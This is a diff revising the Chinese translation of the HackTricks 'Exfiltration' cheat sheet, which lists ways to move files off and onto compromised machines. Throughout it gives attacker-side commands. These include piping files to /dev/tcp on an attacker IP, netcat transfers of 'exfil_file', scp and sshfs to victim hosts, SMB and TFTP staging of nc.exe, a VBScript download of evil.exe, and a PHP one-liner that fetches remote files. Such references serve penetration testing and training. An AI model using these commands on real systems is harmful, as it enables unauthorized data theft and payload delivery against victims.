@@ -1,33 +1,25 @@
-# 数据泄露
+# Exfiltration
 
 {% hint style="success" %}
-学习并练习 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-学习并练习 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>支持 HackTricks</summary>
 
-* 检查[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库提交 PR 来分享黑客技巧。**
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
 
-**Try Hard 安全团队**
+## 常见的白名单域名以提取信息
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+查看 [https://lots-project.com/](https://lots-project.com/) 以查找可以被滥用的常见白名单域名
 
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
-## 常见被允许的域名用于泄露信息
-
-查看 [https://lots-project.com/](https://lots-project.com/) 以找到常见被允许的域名，可以被滥用
-
-## 复制并粘贴 Base64
+## 复制\&粘贴 Base64
 
 **Linux**
 ```bash
@@ -66,7 +58,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### 上传文件
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* [**SimpleHttpServer 打印 GET 和 POST（以及头部）**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Python 模块 [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -123,7 +115,7 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ## FTP
 
-### FTP服务器（Python）
+### FTP 服务器 (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
@@ -133,7 +125,7 @@ python3 -m pyftpdlib -p 21
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTP服务器 (pure-ftp)
+### FTP 服务器 (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -164,14 +156,14 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kali作为服务器
+Kali 作为服务器
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-或者使用samba创建一个smb共享：
+或创建一个 smb 共享 **使用 samba**：
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -187,22 +179,6 @@ guest ok = Yes
 service smbd restart
 ```
 Windows
-
----
-
-### Exfiltration
-
-Exfiltration is the unauthorized transfer of data from a target system. There are various methods to exfiltrate data from a compromised system, including:
-
-- **Email**: Sending data as email attachments to an external email address.
-- **FTP**: Transferring data using the File Transfer Protocol to an external server.
-- **DNS**: Sending data by encoding it within DNS requests to a controlled server.
-- **HTTP/HTTPS**: Sending data over HTTP or HTTPS to a remote server.
-- **Steganography**: Hiding data within other files or images to avoid detection.
-- **Cloud Storage**: Uploading data to cloud storage services such as Dropbox or Google Drive.
-- **Physical Media**: Copying data to removable storage devices like USB drives or external hard drives.
-
-Exfiltration can be a critical phase of an attack as it allows threat actors to steal valuable information from a target organization. Detection and prevention of exfiltration attempts are essential for maintaining the security of a system.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -212,19 +188,19 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-攻击者必须运行SSHd。
+攻击者必须运行 SSHd。
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-如果受害者有SSH，攻击者可以将受害者的目录挂载到攻击者的计算机上。
+如果受害者有SSH，攻击者可以将受害者的目录挂载到攻击者。
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-## 网络通道
+## NC
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -236,7 +212,7 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### 上传文件至受害者
+### 上传文件到受害者
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -265,13 +241,13 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-如果您可以将数据发送到一个SMTP服务器，您可以使用Python创建一个SMTP来接收数据：
+如果您可以将数据发送到SMTP服务器，则可以使用python创建一个SMTP来接收数据：
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-在XP和2003中默认情况下（在其他系统中需要在安装过程中显式添加）
+在XP和2003中默认启用（在其他版本中需要在安装时显式添加）
 
 在Kali中，**启动TFTP服务器**：
 ```bash
@@ -280,36 +256,22 @@ mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**Python中的TFTP服务器：**
+**在Python中的TFTP服务器：**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-在**受害者**中，连接到Kali服务器：
+在**victim**中，连接到Kali服务器：
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-使用 PHP 一行代码下载文件：
+使用 PHP 单行代码下载文件：
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 ## VBScript
-
-### VBScript Exfiltration Techniques
-
-VBScript can be used to exfiltrate data from a compromised system. Below are some common techniques used for data exfiltration using VBScript:
-
-1. **Writing to Files**: VBScript can write data to files on the system, which can then be exfiltrated using various methods.
-
-2. **Sending HTTP Requests**: VBScript can send HTTP requests to an external server controlled by the attacker, allowing data to be exfiltrated over the network.
-
-3. **Using Email**: VBScript can be used to send emails with attached data to an external email address controlled by the attacker.
-
-4. **Executing Commands**: VBScript can execute commands on the compromised system to exfiltrate data through the command line.
-
-5. **Encoding Data**: VBScript can encode exfiltrated data to bypass detection mechanisms and make it harder to detect the exfiltration.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -347,33 +309,31 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe`程序不仅允许检查二进制文件，还具有**从十六进制重建它们的能力**。这意味着通过提供一个二进制文件的十六进制表示，`debug.exe`可以生成该二进制文件。然而，重要的是要注意`debug.exe`有一个**组装文件大小限制为64 kb**。
+`debug.exe`程序不仅允许检查二进制文件，还具有**从十六进制重建它们的能力**。这意味着通过提供二进制文件的十六进制，`debug.exe`可以生成二进制文件。然而，重要的是要注意，debug.exe有**组装文件大小限制为64 kb**。
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
+然后将文本复制粘贴到 windows-shell 中，将创建一个名为 nc.exe 的文件。
+
+* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
 {% hint style="success" %}
-学习和实践AWS黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks培训AWS红队专家（ARTE）**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-学习和实践GCP黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks培训GCP红队专家（GRTE）**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>支持HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* 检查[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享黑客技巧。
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 **上关注我们** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
